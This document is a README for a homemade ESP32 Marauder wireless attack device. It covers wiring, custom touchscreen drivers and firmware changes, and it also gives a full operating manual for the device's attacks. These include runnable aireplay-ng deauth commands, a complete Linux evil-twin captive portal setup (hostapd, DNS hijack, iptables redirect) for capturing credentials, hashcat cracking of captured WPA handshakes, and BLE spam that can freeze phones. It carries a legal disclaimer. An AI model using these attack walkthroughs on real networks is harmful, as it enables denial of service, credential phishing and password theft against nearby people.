# ESP32 Marauder — DIY Build

> ⚠️ **Legal Disclaimer:** This device is built strictly for **educational purposes and authorized security testing only**. Performing any of these attacks on networks or devices you do not own or have explicit written permission to test is **illegal** and may result in criminal charges. Always test only on your own hardware in a controlled, isolated environment.

A custom implementation of [justcallmekoko's ESP32 Marauder v1.11.0](https://github.com/justcallmekoko/ESP32Marauder) built entirely from off-the-shelf components without an official Marauder PCB. This build uses a standard ESP32 DevKit paired with a 2.4" TFT LCD shield featuring an analog resistive touchscreen — hardware that is entirely unsupported by the official firmware and required writing custom drivers from scratch.

---

## Table of Contents

1. [Hardware](#hardware)
2. [Wiring](#wiring)
3. [Software Setup](#software-setup)
4. [How to Use the Device](#how-to-use-the-device)
5. [WiFi Features — Full Reference](#wifi-features--full-reference)
6. [Bluetooth Features — Full Reference](#bluetooth-features--full-reference)
7. [SD Card & PCAP Files](#sd-card--pcap-files)
8. [Settings](#settings)
9. [Serial CLI Reference](#serial-cli-reference)
10. [Testing Attacks on Linux](#testing-attacks-on-linux)
11. [Known Issues & Limitations](#known-issues--limitations)
12. [Code Changes from Stock Marauder](#code-changes-from-stock-marauder)

---

## Hardware

| Component | Details |
|-----------|---------|
| Microcontroller | ESP32 DevKit (30-pin), ESP32-D0WD-V3, 4MB flash, CH340C USB, USB-C |
| Display | 2.4" TFT LCD Shield, ILI9341 driver, **8-bit parallel interface** (not SPI) |
| Touchscreen | Resistive analog touch — no XPT2046 chip, driven entirely by ADC |
| SD Card | FAT32 formatted microSD, separate SPI bus |

---

## Wiring

### Display — 8-bit Parallel Interface

| TFT Pin | ESP32 Pin | Notes |
|---------|-----------|-------|
| 3V3 | 3V3 | Power |
| GND | GND | Ground |
| LCD_RST | D26 | Reset |
| LCD_CS | D27 | Chip select |
| LCD_RS | D14 | Data/command |
| LCD_WR | D32 | Write strobe |
| LCD_RD | D13 | Read strobe |
| LCD_D0 | D16 | Data bit 0 |
| LCD_D1 | D4 | Data bit 1 |
| LCD_D2 | D23 | Data bit 2 |
| LCD_D3 | D22 | Data bit 3 |
| LCD_D4 | D21 | Data bit 4 |
| LCD_D5 | D19 | Data bit 5 |
| LCD_D6 | D18 | Data bit 6 |
| LCD_D7 | D17 | Data bit 7 |

### Touch — Analog Resistive (Extra Wires)

| TFT Pin | ESP32 Pin | Notes |
|---------|-----------|-------|
| LCD_RS | D35 | ADC1 input-only pin, reads Y axis |
| LCD_D1 | D34 | ADC1 input-only pin, reads X axis |

> These are **extra** wires added on top of the display wiring. D34 and D35 are input-only ADC1 pins that allow analog reads without conflicting with display writes.

### SD Card — Separate SPI Bus

| SD Pin | ESP32 Pin |
|--------|-----------|
| SD_SS | D5 |
| SD_DI (MOSI) | D33 |
| SD_DO (MISO) | D25 |
| SD_SCK | D2 |

---

## Software Setup

### Requirements

- **Arduino IDE**
- **ESP32 board package v2.0.14** — important, newer versions may break compilation
- **Libraries:**
  - TFT_eSPI (latest, with manual fix — see below)
  - Adafruit TouchScreen — **s60sc modified version** from [github.com/s60sc/Adafruit_TouchScreen](https://github.com/s60sc/Adafruit_TouchScreen)
  - NimBLE-Arduino

### Arduino IDE Board Settings

```
Board:            LOLIN D32
Flash Frequency:  80MHz
Partition Scheme: Minimal SPIFFS
```

### TFT_eSPI Configuration

Copy this into `Arduino/libraries/TFT_eSPI/User_Setup.h`:

```cpp
#define ILI9341_DRIVER
#define ESP32_PARALLEL

#define TFT_CS   27
#define TFT_DC   14
#define TFT_RST  26
#define TFT_WR   32
#define TFT_RD   13
#define TFT_BL   -1

#define TFT_D0   16
#define TFT_D1    4
#define TFT_D2   23
#define TFT_D3   22
#define TFT_D4   21
#define TFT_D5   19
#define TFT_D6   18
#define TFT_D7   17

#define TFT_MISO 25
#define TFT_MOSI 33
#define TFT_SCLK 2

#define LOAD_GLCD
#define LOAD_FONT2
#define LOAD_FONT4
#define LOAD_FONT6
#define LOAD_FONT7
#define LOAD_FONT8
#define LOAD_GFXFF
#define SMOOTH_FONT
```

### Required Manual Fix for TFT_eSPI

Without this fix the display will not work. Open `Arduino/libraries/TFT_eSPI/Processors/TFT_eSPI_ESP32.c` and replace all 3 occurrences of:
```c
reg = gpio_input_get();
```
with:
```c
reg = REG_READ(GPIO_IN_REG);
```

---

## How to Use the Device

### Touch Zones

The screen has **no physical buttons**. It is divided into 3 horizontal tap zones:

```
┌──────────────────────────┐
│                          │
│   TAP = SCROLL UP / PREV │  ← Top third of screen
│                          │
├──────────────────────────┤
│                          │
│   TAP = SELECT / CONFIRM │  ← Middle third of screen
│                          │
├──────────────────────────┤
│                          │
│  TAP = SCROLL DOWN / NEXT│  ← Bottom third of screen
│                          │
└──────────────────────────┘
```

### Basic Navigation

1. Power on → splash screen → main menu loads
2. **Top zone** — scroll up through menu items
3. **Bottom zone** — scroll down through menu items
4. **Middle zone** — select the highlighted item
5. **Tap anywhere** while a scan or attack is running → stops it and returns to menu

### Brightness Adjustment

Available from the main menu or connected WiFi screen only:

1. **Hold** the top or bottom zone for **1.5 seconds**
2. Brightness screen appears
3. **Tap top** = brighter, **tap bottom** = dimmer
4. **Tap middle** or wait 3 seconds → saves and exits

### Menu Structure Overview

```
Main Menu
├── WiFi
│   ├── Sniffers
│   │   ├── Scan APs
│   │   ├── Scan Stations
│   │   ├── Scan All
│   │   ├── Beacon Sniff
│   │   ├── Probe Request Sniff
│   │   ├── Deauth Sniff
│   │   ├── Raw Sniff
│   │   ├── EAPOL/PMKID Scan
│   │   ├── Packet Monitor
│   │   ├── Channel Analyzer
│   │   ├── Signal Monitor
│   │   └── Wardrive
│   ├── General
│   │   ├── Select APs
│   │   ├── Select Stations
│   │   ├── Add SSID
│   │   └── Generate SSID
│   └── Attacks
│       ├── Deauth Flood
│       ├── Deauth Targeted
│       ├── Beacon Spam List
│       ├── Random Beacon Spam
│       ├── AP Clone Spam
│       ├── Evil Portal
│       ├── Auth Flood
│       └── CSA Attack
├── Bluetooth
│   ├── Scanners
│   │   ├── BLE Scan All
│   │   ├── AirTag Detection
│   │   ├── Flipper Zero Detection
│   │   └── Skimmer Detection
│   └── Attacks
│       ├── Sour Apple (iOS spam)
│       ├── SwiftPair Spam (Windows)
│       ├── Samsung BLE Spam
│       ├── Google BLE Spam
│       ├── Flipper Spam
│       └── BLE Spam All
└── Settings
```

---

## WiFi Features — Full Reference

### Scanners / Sniffers

#### Scan APs (Access Point Scan)
Passively listens for beacon frames to discover all nearby access points. Displays SSID, BSSID (MAC address), channel number, signal strength (RSSI), and encryption type. Results are kept in memory for use with attacks. If an SD card is present, saves results as a PCAP file automatically.

**How to use:**
1. WiFi → Sniffers → Scan APs
2. Wait for networks to populate on screen
3. Tap anywhere to stop

#### Scan Stations
Passively sniffs probe requests and data frames to discover client devices that are currently associated with APs. Shows each station's MAC address and the AP it is connected to. Required before running Targeted Deauth.

**How to use:**
1. WiFi → Sniffers → Scan Stations
2. Let it run for at least 30–60 seconds to populate results
3. Tap to stop

#### Scan All
Runs AP scan and station scan simultaneously. Most efficient way to map both infrastructure and clients in one pass.

#### Beacon Sniff
Captures and logs raw beacon frames from all APs. Unlike Scan APs which shows unique SSIDs, Beacon Sniff logs every individual beacon frame. Useful for traffic analysis and PCAP capture.

#### Probe Request Sniff
Captures probe request frames sent by nearby devices looking for known networks. These reveal the SSIDs that nearby devices have previously connected to — useful for identifying target devices and their network history.

#### Deauth Sniff
Passively monitors for deauthentication frames on the current channel. Useful for detecting if someone else is running a deauth attack nearby, or for confirming that your own attack frames are visible on the air.

#### Raw Sniff (Raw Packet Capture)
Captures ALL 802.11 frames on the current channel — management, data, and control frames — with no filtering. Saves to SD card as a PCAP file openable in Wireshark for full analysis. The most comprehensive capture mode available.

**Buttons while running:**
- `–` / `+` — Change channel down/up
- `HOP` — Toggle automatic channel hopping on/off
- `✕` — Stop capture and return to menu

#### EAPOL / PMKID Scan
Specifically targets WPA/WPA2 handshake material. Captures EAPOL (4-way handshake) frames and PMKID values from beacon/association frames. The saved PCAP files contain everything needed to attempt offline password cracking with `hashcat` or `aircrack-ng`. This is a powerful passive capability — it can capture credential material without deauthenticating anyone.

**How to use:**
1. WiFi → Sniffers → EAPOL/PMKID Scan
2. Optionally select a specific AP first (WiFi → General → Select APs) to filter results
3. Wait for "Received EAPOL" messages to appear on screen
4. Stop and copy the PCAP from SD card to your computer for analysis

**To crack the captured handshake on Linux:**
```bash
# Convert PCAP to hashcat format
hcxpcapngtool -o hash.hc22000 pmkid_0.pcap

# Crack with hashcat (GPU accelerated)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Or with aircrack-ng (CPU only, slower)
aircrack-ng -w /usr/share/wordlists/rockyou.txt pmkid_0.pcap
```

#### Packet Monitor
Real-time graphical display showing live counts of beacon frames, probe requests, and deauth frames over time on a scrolling line graph. Gives a visual overview of wireless activity on the current channel.

**Buttons while running:**
- `X–` / `X+` — Adjust horizontal (time) scale
- `Y–` / `Y+` — Adjust vertical (count) scale
- `CH–` / `CH+` — Change channel
- `✕` — Stop

#### Channel Analyzer
Scans all WiFi channels and displays a bar graph showing activity level per channel. Useful for finding the least congested channel or identifying which channels have the most traffic.

#### Signal Monitor
Monitors RSSI of selected APs over time. Useful for physical direction-finding — RSSI increases as you move closer to an AP.

#### Wardrive
Combines WiFi scanning with GPS logging. Records each AP's BSSID, SSID, encryption, RSSI, and GPS coordinates to a log file on the SD card. Compatible with wardriving databases and mapping tools.

> **Note:** This build has no GPS module connected. Wardriving is defined but produces no location data without hardware.

---

### WiFi Attacks

#### Deauth Flood
Sends forged 802.11 deauthentication frames at high rate targeting all clients on a selected AP. Exploits the fact that 802.11 management frames (including deauth) are unauthenticated in WPA2 — any device can forge them.

**How to use:**
1. WiFi → Sniffers → Scan APs (wait for target to appear)
2. WiFi → General → Select APs (tap the target network)
3. WiFi → Attacks → Deauth Flood
4. Tap anywhere to stop

> **Current Status:** Partially working. Packets are sent (confirmed via serial monitor) but target devices are not disconnecting due to a MAC address spoofing issue. See Known Issues.

#### Targeted Deauth
Same as Deauth Flood but targets a specific client device. Sends deauth frames in both directions (AP→client and client→AP). More effective than flood when working. Requires scanning stations first.

**How to use:**
1. WiFi → Sniffers → Scan Stations (run for 30–60 seconds)
2. WiFi → General → Select Stations (tap the target device)
3. WiFi → General → Select APs (tap the AP the target is connected to)
4. WiFi → Attacks → Deauth Targeted
5. Tap anywhere to stop

> **Current Status:** Touch/exit works correctly. Same packet transmission issue as flood.

#### Beacon Spam (List)
Broadcasts fake WiFi networks using SSIDs from a generated list. Creates many phantom networks that appear in nearby devices' WiFi scan lists.

**How to use:**
1. WiFi → General → Generate SSID (creates a list of fake SSIDs)
2. WiFi → Attacks → Beacon Spam List

#### Random Beacon Spam
Same as Beacon Spam but with randomly generated SSIDs — no list required.

**How to use:**
1. WiFi → Attacks → Random Beacon Spam

#### AP Clone Spam
Scans real APs and broadcasts clones of them with identical SSIDs. More convincing than random beacon spam because it mimics real nearby networks.

**How to use:**
1. WiFi → Sniffers → Scan APs
2. WiFi → General → Select APs (select APs to clone)
3. WiFi → Attacks → AP Clone Spam

#### Evil Portal
Creates a rogue WiFi access point and hosts a web page on it. When a victim connects and opens any web page, they are redirected to the hosted page — typically a fake login page. Credentials appear in the serial monitor.

**Requirements:** `index.html` must exist in the **root directory** of the SD card.

**How to use:**
1. Place `index.html` in the root of the SD card (rename your portal file to exactly `index.html`)
2. Either add an SSID (WiFi → General → Add SSID) or select an AP to clone
3. WiFi → Attacks → Evil Portal
4. Connect a device to the broadcast network — any HTTP page will redirect to your portal
5. Credentials appear in the serial output at 115200 baud

**HTML templates for Evil Portal:**
Download ready-made portal pages from [bigbrodude6119/evil-portal-web-page](https://github.com/bigbrodude6119/evil-portal-web-page) — includes fake ISP login pages, generic login pages, and more.

> **Current Status:** Evil Portal logic works correctly but **`index.html` fails to load from SD card** during WiFi operation due to SPI bus contention. Serial output shows `Evil Portal Found 0 HTML files`. See Known Issues for workaround.

#### Auth Flood
Sends large numbers of authentication request frames to an AP. Can overwhelm the AP's association table, causing denial of service to legitimate clients trying to connect.

#### CSA Attack (Channel Switch Announcement)
Sends forged Channel Switch Announcement frames to clients connected to a target AP. Tells clients the AP is moving to a different channel, causing them to switch channels and temporarily disconnect.

---

## Bluetooth Features — Full Reference

### BLE Scanners

#### BLE Scan All
Passively scans for all Bluetooth Low Energy advertising devices in range. Displays MAC addresses, device names, RSSI, and advertisement data for every BLE device detected.

#### AirTag Detection
Looks for Apple AirTag advertisement signatures. Useful for detecting if you are being tracked by a hidden AirTag. Displays time since last seen and MAC address of detected AirTags.

#### Flipper Zero Detection
Scans for BLE advertisements matching known Flipper Zero signatures.

#### Skimmer Detection
Scans for BLE devices matching known signatures of Bluetooth credit card skimmers. Useful at ATMs and payment terminals.

### BLE Attacks

#### Sour Apple
Exploits a vulnerability in Apple devices (iOS 17 and earlier). Sends a rapid flood of fake BLE pairing notifications from randomly generated MAC addresses. Affected Apple devices receive continuous popup notifications and may become temporarily unresponsive. Recovery takes a few minutes after the attack stops.

#### SwiftPair Spam (Windows)
Exploits Microsoft's SwiftPair feature by broadcasting fake BLE pairing advertisements. Windows PCs receive repeated notifications about new devices wanting to pair — can generate over 1,000 notifications per minute.

#### Samsung BLE Spam
Sends fake pairing notifications crafted for Samsung Galaxy devices. Sends spam notifications without crashing the device.

#### Google BLE Spam
Same concept as Samsung spam but targets Google/Android devices.

#### Flipper Spam
Broadcasts BLE advertisements mimicking Flipper Zero devices.

#### BLE Spam All
Runs all BLE attack types simultaneously — targets Apple, Windows, Samsung, Google, and Flipper devices at once.

> **Current Status:** BLE spam functions correctly but the touchscreen becomes unresponsive during spam because `NimBLEDevice::init()` and `deinit()` block the CPU for 50–100ms per cycle. Use the serial CLI (`#stopscan`) to stop when touch is unresponsive.

---

## SD Card & PCAP Files

### SD Card Setup

- Format as **FAT32**
- For Evil Portal: place `index.html` in the root directory
- PCAP files are saved automatically to the root directory when any sniffer runs

### PCAP File Names

| Scan Mode | File Name |
|-----------|-----------|
| Raw Sniff | `raw_0.pcap` |
| EAPOL/PMKID | `pmkid_0.pcap` |
| Packet Monitor | `packet_monitor_0.pcap` |
| Beacon Sniff | `beacon_0.pcap` |
| Probe Sniff | `probe_0.pcap` |
| Deauth Sniff | `deauth_0.pcap` |

The number increments if a file already exists (`raw_1.pcap`, `raw_2.pcap`, etc.)

### Analyzing PCAP Files in Wireshark

1. Copy `.pcap` file from SD card to your computer
2. Open with [Wireshark](https://www.wireshark.org/)

Useful display filters:
```
wlan.fc.type_subtype == 0x08    # Beacon frames only
wlan.fc.type_subtype == 0x0c    # Deauth frames only
eapol                            # EAPOL handshake frames
wlan.addr == XX:XX:XX:XX:XX:XX  # Filter by MAC address
```

---

## Settings

| Setting | Default | Description |
|---------|---------|-------------|
| SavePCAP | false | Save captured packets to SD card as PCAP |
| ChanHop | true | Automatically hop between WiFi channels |
| ForcePMKID | false | Force PMKID capture during EAPOL scan |
| ForceProbe | false | Force active probe requests during scans |
| EnableLED | false | Enable NeoPixel LED status indicator |
| EPDeauth | false | Auto-deauth clients to force them to Evil Portal |

**Change a setting via CLI:**
```
#settings -s SavePCAP enable
#settings -s ChanHop disable
```

---

## Serial CLI Reference

Connect via USB at **115200 baud**. All commands start with `#`. Type `#help` for the full list.

### Scanning

```bash
#scanap                  # Scan for access points
#scanstation             # Scan for client devices
#scanall                 # Scan APs and stations together
#sniffraw                # Raw packet capture
#sniffbeacon             # Beacon frame capture
#sniffprobe              # Probe request capture
#sniffdeauth             # Deauth frame capture
#sniffeapol              # EAPOL/PMKID capture
#sigmon                  # Signal strength monitor
#stopscan                # Stop any running scan
#stopscan -f             # Force stop and reset WiFi
```

### Attacks

```bash
# Deauth
#attack -t deauth                        # Deauth flood (requires selected AP)
#attack -t deauth -c                     # Targeted deauth (requires AP + station)

# Beacon spam
#attack -t beacon -r                     # Random beacon spam
#attack -t beacon -l                     # Beacon spam from SSID list

# Evil Portal
#evilportal -c start                     # Start evil portal
#evilportal -c start -w mypage.html      # Use specific HTML file

# BLE spam
#blespam -t apple                        # Sour Apple (iOS)
#blespam -t windows                      # SwiftPair (Windows)
#blespam -t samsung                      # Samsung
#blespam -t google                       # Google
#blespam -t all                          # All types
```

### Selection & Lists

```bash
#list -a                       # List all scanned APs
#list -s                       # List all scanned stations
#select -a 0                   # Select AP at index 0
#select -s 0,1,2               # Select stations 0, 1, 2
#select -a -f "contains Home"  # Select APs by name
```

### Utility

```bash
#channel -s 6           # Lock to channel 6
#settings               # View all settings
#settings -r            # Reset settings to default
#ls                     # List SD card files
#info                   # Device info
#reboot                 # Reboot
#randapmac              # Randomize AP MAC
#brightness -s 5        # Set brightness 0–9
```

---

## Testing Attacks on Linux

This section explains how to verify and replicate the device's attacks from a Linux machine. All tests must be performed on **your own equipment** in an **isolated environment**.

### Prerequisites

You need a Linux machine (Kali Linux recommended) and a **wireless adapter that supports monitor mode and packet injection**. Built-in laptop WiFi cards typically do NOT support injection.

Recommended adapters:
- Alfa AWUS036ACH (dual-band, excellent support)
- Alfa AWUS036NHA (2.4GHz, very reliable)
- TP-Link TL-WN722N **v1 only** (v2/v3 do NOT support injection)

**Install tools:**
```bash
sudo apt update
sudo apt install aircrack-ng wireshark tcpdump hostapd dnsmasq
```

---

### Testing Deauth Attacks

#### Enabling Monitor Mode

```bash
# Kill processes that interfere
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Interface is now called wlan0mon

# Verify
iwconfig
```

#### Verifying Marauder's Deauth Frames with tcpdump

Lock to the same channel as your target, then capture:

```bash
sudo iwconfig wlan0mon channel 6
sudo tcpdump -i wlan0mon -e type mgt subtype deauth 2>/dev/null
```

Start the Deauth attack on Marauder. You should see output like:
```
11:23:14 BSSID:58:7f:66:50:f1:e0 DA:d0:b1:28:c9:49:ff SA:58:7f:66:50:f1:e0
```
If you see nothing, frames are not being transmitted (MAC mismatch issue — see Known Issues).

#### Verifying with airodump-ng

Terminal 1 — monitor the target:
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

Start the Marauder attack. In the airodump output, watch the `Lost` column for the target station. If it increases rapidly and the station disappears from the list, the deauth worked.

#### Replicating Deauth with aireplay-ng (Linux)

Use this when Marauder's deauth is not working, or to compare behavior:

```bash
# Step 1: Start monitor mode (if not already done)
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Find target AP BSSID, channel, and client MAC
sudo airodump-ng wlan0mon
# Note the BSSID and CH of your target AP
# Note the STATION MAC of the client to disconnect

# Step 3: Lock airodump to the target for live monitoring
# (Terminal 1 — leave running)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Step 4: Send deauth frames (Terminal 2)

# Flood all clients on the AP:
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Target a specific client only:
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon

# Send only 10 bursts (then stop automatically):
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon

# -0 = deauth attack mode
# first number = burst count (0 = continuous)
# -a = target AP BSSID
# -c = target client MAC (omit for broadcast to all clients)

# Stop: Ctrl+C
```

Watch Terminal 1 — the target station's `Lost` counter should increase and it should eventually disappear from the list.

**Restore your adapter:**
```bash
sudo airmon-ng stop wlan0mon
sudo service NetworkManager start
```

---

### Setting Up an Evil Twin / Captive Portal on Linux

This replicates what Marauder's Evil Portal does from a Linux machine. Useful for testing your portal HTML or as a fallback when the ESP32's SD card is unreadable.

**You need two wireless interfaces:**
- `wlan0` — connected to the internet (for traffic passthrough)
- `wlan1` — becomes the fake AP (must support AP/master mode)

#### Step 1 — Configure the Fake AP with hostapd

Create `/etc/hostapd/evil.conf`:
```
interface=wlan1
driver=nl80211
ssid=FREE_WIFI
channel=6
hw_mode=g
```
> Change `ssid` to match a nearby real network for maximum effect (evil twin).

#### Step 2 — Configure DHCP and DNS with dnsmasq

Create `/etc/dnsmasq.conf`:
```
interface=wlan1
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,8h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
```
The last line (`address=/#/10.0.0.1`) redirects **all DNS queries** to your machine — this is what makes the captive portal automatically pop up.

#### Step 3 — Place Your Portal HTML

```bash
sudo cp index.html /var/www/html/index.html
sudo service apache2 start
```

#### Step 4 — Configure Networking

```bash
# Assign IP to fake AP interface
sudo ip addr add 10.0.0.1/24 dev wlan1
sudo ip link set wlan1 up

# Enable forwarding for internet passthrough (optional)
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan1 -o wlan0 -j ACCEPT

# Redirect all HTTP traffic to Apache
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 \
  -j DNAT --to-destination 10.0.0.1:80
```

#### Step 5 — Start the Attack

```bash
sudo airmon-ng check kill
sudo hostapd /etc/hostapd/evil.conf &
sudo dnsmasq -C /etc/dnsmasq.conf
```

Any device that connects to `FREE_WIFI` and opens a browser will see your captive portal page.

#### Step 6 — Force Clients Off the Real Network (Optional)

Combine with deauth to force clients off the real AP and onto yours:
```bash
# In a separate terminal
sudo airmon-ng start wlan0
sudo aireplay-ng -0 0 -a [REAL_AP_BSSID] wlan0mon
```

#### Step 7 — Clean Up

```bash
sudo killall hostapd dnsmasq
sudo iptables -F
sudo iptables -t nat -F
sudo airmon-ng stop wlan0mon
sudo service NetworkManager start
```

---

### Verifying BLE Attacks

**On Android:** Install **nRF Connect** by Nordic Semiconductor. Start BLE Spam All on Marauder — nRF Connect should show dozens of new BLE devices appearing per second with random MACs.

**On nearby devices:** Apple devices should receive repeated popup notifications. Windows PCs with Bluetooth should show SwiftPair notifications.

**On Linux:**
```bash
# Install tools
sudo apt install bluez

# Scan for BLE devices
sudo hcitool lescan --duplicates

# More detail with bettercap
sudo bettercap -iface wlan0
# In bettercap console:
ble.recon on
```

---

### Analyzing PCAP Files from the SD Card on Linux

```bash
# View summary
tcpdump -r raw_0.pcap -e -v | head -50

# Filter deauth frames only
tcpdump -r raw_0.pcap -e "type mgt subtype deauth"

# Filter EAPOL handshake frames
tcpdump -r raw_0.pcap -e "ether proto 0x888e"

# Open in Wireshark (GUI)
wireshark raw_0.pcap

# File statistics
capinfos raw_0.pcap
```

---

## Known Issues & Limitations

### 1. Deauth Not Disconnecting Devices

**Symptom:** Deauth attack shows 3000+ packets sent but no devices disconnect. tcpdump on a Linux monitor shows no deauth frames on the air.

**Root cause:** The ESP32's WiFi AP interface has a fixed hardware MAC address. When `esp_wifi_80211_tx()` is used to inject raw frames, the ESP-IDF silently drops frames whose source MAC field does not match the AP interface's actual hardware MAC. The device builds the frame correctly with the target AP's BSSID as the source — but the radio never transmits it because of this mismatch.

**What works:** aireplay-ng sets the wireless adapter's MAC to match the target AP before injecting, which is why it succeeds where Marauder does not.

**Fix in progress:** `esp_wifi_set_mac(WIFI_IF_AP, target_bssid)` needs to be called once per target AP before the burst loop. Calling it per-frame caused device freezing because it reinitializes MAC hardware each time.

**Workaround:** Use aireplay-ng on Linux for reliable deauth attacks.

---

### 2. Evil Portal — SD Card Cannot Read index.html

**Symptom:** Serial output shows `Evil Portal Found 0 HTML files` even when `index.html` is correctly placed in the SD card root.

**Root cause:** The SD card shares the SPI bus with other peripherals. When the WiFi radio initializes during Evil Portal startup, it causes SPI timing instability that causes the SD card read to fail. This is a hardware-level limitation of the component combination.

**Workaround:** Use the serial CLI command `#evilportal -c start -w index.html` immediately after boot, before navigating any menus or starting any WiFi activity. At that point the SD card is still accessible and the HTML file loads successfully.

---

### 3. BLE Spam — Touch Unresponsive During Attack

**Symptom:** Touchscreen stops responding when BLE spam is active. The device keeps running but cannot be stopped from the screen.

**Root cause:** `NimBLEDevice::init()` and `NimBLEDevice::deinit()` are called every spam cycle. Each call blocks the CPU for 50–100ms, preventing the main loop from polling touch input.

**Fix in progress:** Moving BLE spam to ESP32 Core 1 as a FreeRTOS task so it runs independently of the main loop touch polling.

**Workaround:** Type `#stopscan` in the serial monitor (115200 baud) to stop BLE spam when touch is unresponsive.

---

### 4. SD Card Errors During Active WiFi Scan

**Symptom:** PCAP files may be 0 bytes or fail to save during active WiFi scanning. Serial output shows SD write errors.

**Root cause:** SPI bus contention — the WiFi radio's interrupt load causes timing issues that interrupt SD write operations.

**Impact:** The scan itself works correctly and all data is visible on screen. Only SD card saving is affected.

---

### 5. Deauth Ineffective Against PMF-Protected Devices

Even with the MAC spoofing fix applied, deauth attacks will **not work** against devices using 802.11w Protected Management Frames (PMF). PMF cryptographically authenticates management frames, making forged deauth frames detectable and ignorable by the target.

PMF is mandatory in WPA3 and commonly enabled in WPA2 on routers manufactured after ~2020. Most modern phones (Android 10+, iOS 14+, Windows 10+) also implement PMF on the client side.

**How to check:** Look at the encryption column during AP scan. Devices showing `WPA2 CCMP PSK` may have PMF enabled depending on router configuration. Check your router's admin panel for settings labeled "802.11w", "PMF", or "Management Frame Protection" — if set to "Required" or "Optional", deauth will not work.

---

## Code Changes from Stock Marauder v1.11.0

This build required substantial modifications to run on unsupported hardware. Every change from stock firmware is documented here.

### configs.h

- Added `MARAUDER_V4` hardware profile with correct feature flags
- Disabled `HAS_BATTERY` (no MAX17048 chip)
- Disabled `HAS_BUTTONS` (touch-only)
- Kept `HAS_C5_SD` — required for SD init on this hardware
- Added SD pin definitions: MISO=25, MOSI=33, SCK=2, CS=5
- Added `#else` fallback for `MEM_LOWER_LIM`

### Display.cpp

- Implemented complete custom `updateTouch()` for analog resistive touch (no XPT2046)
- Touch uses ADC1 pins D34/D35 to read X/Y axis voltages
- Built 60-point bilinear interpolation calibration grid (6×10) for coordinate mapping
- Mean touch accuracy ~8px — sufficient for 3-zone navigation
- Commented out both `tft.setTouch(calData)` calls (incompatible with custom analog touch)
- Added `touchToExit()` helper for attack screens

### esp32_marauder.ino

- Added `volatile` touch state globals (`touch_x`, `touch_y`, `touch_pending`) for Core 0 ↔ Core 1 communication
- Added `touchTask()` FreeRTOS function — polls `updateTouch()` on Core 1 every 25ms
- Added `xTaskCreatePinnedToCore()` call in `setup()` to launch touch task on Core 1
- Fixed `TFT_BL` — added check for `-1` before calling `pinMode` (prevents invalid pin error at boot)
- Added `BL_SETUP()`, `BL_SET()`, `BL_PREVIEW()` macros with shims for board package 2.x vs 3.x LEDC API differences

### MenuFunctions.cpp

- Added `extern volatile` declarations for touch globals at top of file
- Replaced `display_obj.updateTouch()` call in `main()` with `touch_pending` check — reads from Core 1 task
- Fixed `checkAnalyzerButtons()` — removed broken `while(display_obj.updateTouch(...))` hold-detection loop
  - Root cause: `updateTouch()` uses a `wasPressed` edge-detection latch — returns `1` only once per press then `0` until release, so the `while` loop always immediately exited, discarding the captured touch coordinates
  - Fix: use coordinates already captured by the initial call, skip the while loop entirely
- Added touch-to-exit check at the top of `WIFI_ATTACK_DEAUTH_TARGETED` block

### WiFiScan.cpp

- Fixed `EvilPortal.h` — changed `static char index_html[]` initialization to prevent compilation error
- Added `__attribute__((weak))` to `ieee80211_raw_frame_sanity_check` to prevent linker conflict
- Removed duplicate `HardwareSerial Serial2` declaration in GPS interface
- Added `vTaskDelay(1)` at end of `packetRateLoop()` — fixes touch unresponsiveness during raw capture by yielding to FreeRTOS scheduler
- Added `vTaskDelay(1)` inside `packetMonitorMain()` for-loop — fixes packet monitor button unresponsiveness for same reason
- Fixed BSSID field in `sendDeauthFrame()` second packet: bytes 16–21 were incorrectly set to client MAC instead of AP BSSID, making the reverse-direction deauth frame malformed and unrecognized
- Added `delay(100)` after `esp_wifi_start()` in `startWiFiAttacks()` — fixes `ESP_ERR_WIFI_NOT_INIT` (error 258) on first frame after WiFi init
- Throttled BLE spam loop to 200ms intervals to reduce CPU blocking from NimBLE init/deinit

---

## Credits

- Original firmware: [justcallmekoko/ESP32Marauder](https://github.com/justcallmekoko/ESP32Marauder)
- Modified TouchScreen library: [s60sc/Adafruit_TouchScreen](https://github.com/s60sc/Adafruit_TouchScreen)
- TFT_eSPI library: [Bodmer/TFT_eSPI](https://github.com/Bodmer/TFT_eSPI)
- Evil Portal HTML templates: [bigbrodude6119/evil-portal-web-page](https://github.com/bigbrodude6119/evil-portal-web-page)
- Built by: Baraa Elgamal
